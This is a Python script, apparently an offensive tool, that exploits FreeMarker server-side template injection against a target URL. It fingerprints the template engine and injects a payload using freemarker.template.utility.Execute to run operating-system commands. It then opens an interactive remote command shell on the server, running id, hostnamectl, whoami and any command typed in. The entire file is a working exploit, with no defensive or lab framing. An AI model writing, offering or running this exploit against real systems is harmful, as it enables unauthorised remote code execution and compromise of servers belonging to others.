import argparse
import requests
import time
from datetime import datetime


# functions
def response(stri):
    a = stri.split('*')
    return "".join(
        a[i + 1]
        for i, n in enumerate(a)
        if n == 'realbacon' and a[i + 1] != 'realbacon'
    ).strip()


def inject(payload):
    d = {
        args.data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("' + payload + '") }*realbacon*'}
    p = requests.post(args.url, data=d)
    return p.text


print('Freemarker template injection made by Realbacon (it\' s bad)')

# parsing arguments
parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('-u', type=str, dest='url', required=True,
                    help='Url of the target')
parser.add_argument('-d', dest='data', required=True,
                    help='POST variable to inject')
args = parser.parse_args()

# try to get a response from the url
try:
    r = requests.get(args.url)

except:
    print('[-]Invalid url')
    exit()
data_fr = {args.data: "${{7*'7'}}"}
data_sr = {args.data: "*realbacon*${.version}*realbacon*"}
fr = requests.post(args.url, data_fr)
sr = requests.post(args.url, data_sr)

# Try to see if the website is running FREEMARKER
if 'freemarker' in fr.text:
    print(f'[+]Url : {args.url} seems to run with FREEMARKER {response(sr.text)}')
else:
    print(f'[-]Url : {args.url} does not seem to run with FREEMARKER (maybe not injectable)')
    if input('Do you want to continue injection ? (y/n)') == 'n': exit()

time.sleep(1)
# Try to see if we can get back the data from command injection
print(f'[+]Trying injection with post data : {args.data}')
data_test = {
    args.data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("echo $baconed$") }*realbacon*'}
payload_test = requests.post(args.url, data=data_test)

time.sleep(0.5)
if response(payload_test.text) == '$baconed$':
    print('[+]Injection successfull\n[+]Opening shell')
else:
    # We dont get a response so we close the program
    print("[-]Target does not seem to be injectable...\n[-]Aborting...")
    exit()

time.sleep(1)
# retrive date
now = datetime.now()
time_display = now.strftime("%d/%m/%Y %H:%M:%S")

# open the shell
print(f'\n[+]Shell opened at {time_display}')
print('[+]' + response(inject('id')))
print("[+]Current version of OS :", response(inject('hostnamectl')))
print("[+]Current path :", response(inject('pwd')))

while True:
    user_data = input(f'{response(inject("whoami"))}${response(inject("pwd"))} - ')
    if user_data == 'exit': exit()
    print(response(inject(user_data)))
